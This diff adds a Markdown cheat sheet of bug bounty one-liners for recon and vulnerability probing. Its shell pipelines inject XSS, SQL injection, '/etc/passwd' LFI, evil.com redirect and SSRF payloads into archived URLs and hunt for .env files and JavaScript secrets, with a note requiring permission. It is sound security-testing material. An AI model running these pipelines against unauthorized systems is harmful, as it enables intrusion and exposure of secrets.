@@ -1,0 +1,141 @@
+# Robust Bug Bounty One-Liners
+
+This is a collection of **highly robust one-liners** designed for bug bounty hunters and ethical hackers. These commands combine powerful tools for automation, reconnaissance, and vulnerability discovery.
+
+---
+
+## 1. **Harvest Archived URLs**
+Fetch URLs from Wayback Machine for a given domain.
+```bash
+echo "example.com" | waybackurls > urls.txt
+```
+
+---
+
+## 2. **Filter URLs for XSS and Inject Payloads**
+Find potential XSS candidates and inject test payloads.
+```bash
+echo "example.com" | waybackurls | gf xss | qsreplace "<svg/onload=alert(1)>" > xss_test_urls.txt
+```
+
+---
+
+## 3. **Identify Open Redirect Vulnerabilities**
+Filter redirect candidates and replace query parameters with malicious payloads.
+```bash
+echo "example.com" | waybackurls | gf redirect | qsreplace "https://evil.com" > open_redirects.txt
+```
+
+---
+
+## 4. **Find SQL Injection Candidates**
+Filter URLs for SQL injection and inject test payloads.
+```bash
+echo "example.com" | waybackurls | gf sqli | qsreplace "' OR 1=1 --" > sqli_test_urls.txt
+```
+
+---
+
+## 5. **Extract and Analyze JavaScript Files**
+Find `.js` files and analyze them for sensitive information.
+```bash
+echo "example.com" | waybackurls | grep "\.js$" | httpx -silent -o js_files.txt && \
+cat js_files.txt | xargs -I{} python3 linkfinder.py -i {} -o cli
+```
+
+---
+
+## 6. **Test for Local File Inclusion (LFI)**
+Find LFI candidates and replace parameters with test payloads.
+```bash
+echo "example.com" | waybackurls | gf lfi | qsreplace "../../../../etc/passwd" > lfi_test_urls.txt
+```
+
+---
+
+## 7. **Crawl Archived URLs and Discover Endpoints**
+Fetch Wayback Machine URLs and crawl for additional endpoints.
+```bash
+echo "example.com" | waybackurls | katana -silent -d 2 > crawled_endpoints.txt
+```
+
+---
+
+## 8. **Scan URLs with Nuclei**
+Scan URLs with Nuclei templates for known vulnerabilities.
+```bash
+nuclei -l urls.txt -t nuclei-templates/ -o nuclei_results.txt
+```
+
+---
+
+## 9. **Server-Side Request Forgery (SSRF) Testing**
+Filter SSRF candidates and replace query parameters with payloads pointing to a Collaborator server.
+```bash
+echo "example.com" | waybackurls | gf ssrf | qsreplace "http://<collaborator_payload>" > ssrf_test_urls.txt
+```
+
+---
+
+## 10. **Automated Recon and Vulnerability Workflow**
+A full pipeline to find, test, and scan for multiple vulnerabilities.
+```bash
+echo "example.com" | waybackurls | tee urls.txt | \
+gf xss | qsreplace "<svg/onload=alert(1)>" | httpx -silent -o xss_results.txt && \
+gf sqli | qsreplace "' OR 1=1 --" | httpx -silent -o sqli_results.txt && \
+gf ssrf | qsreplace "http://<collaborator_payload>" | httpx -silent -o ssrf_results.txt && \
+gf lfi | qsreplace "../../../../etc/passwd" | httpx -silent -o lfi_results.txt && \
+cat urls.txt | grep "\.js$" | httpx -silent -o js_files.txt && \
+cat js_files.txt | xargs -I{} python3 linkfinder.py -i {} -o cli | tee js_endpoints.txt && \
+nuclei -l urls.txt -t nuclei-templates/ -o nuclei_results.txt
+```
+
+---
+
+## 11. **Detect Web Application Firewalls (WAFs)**
+Combine Waybackurls and WAF detection using wafw00f.
+```bash
+echo "example.com" | waybackurls | httpx -silent | xargs -I{} wafw00f -a {}
+```
+
+---
+
+## 12. **Search for Sensitive Backup Files**
+Find backup or sensitive files like `.zip`, `.tar`, or `.env`.
+```bash
+echo "example.com" | waybackurls | egrep "\.zip|\.tar|\.env|\.bak" > sensitive_files.txt
+```
+
+---
+
+## 13. **Fuzz Query Parameters**
+Extract URLs with parameters and fuzz them using a wordlist.
+```bash
+echo "example.com" | waybackurls | grep "?" | qsreplace FUZZ | ffuf -w wordlist.txt -u "URL"
+```
+
+---
+
+## 14. **Analyze JavaScript for Secrets**
+Combine `gf` and `linkfinder` to find secrets in JavaScript files.
+```bash
+echo "example.com" | waybackurls | grep "\.js$" | httpx -silent -o js_files.txt && \
+cat js_files.txt | xargs -I{} python3 linkfinder.py -i {} -o cli | gf secrets > js_secrets.txt
+```
+
+---
+
+## 15. **Blind Vulnerabilities with Collaborator**
+Test SSRF or other blind vulnerabilities with Burp Collaborator payloads.
+```bash
+echo "example.com" | waybackurls | gf ssrf | qsreplace "http://<collaborator_payload>" > ssrf_collaborator_urls.txt
+```
+
+---
+
+## Notes
+- **Ethical Usage**: Always ensure you have permission to test any system. Unauthorized testing is illegal and unethical.
+- **Dependencies**: Make sure you have the following tools installed: `waybackurls`, `gf`, `qsreplace`, `katana`, `nuclei`, `httpx`, `linkfinder`, and others.
+- **Customization**: Replace placeholders (e.g., `<collaborator_payload>`) with your specific configurations.
+
+Happy Hunting!
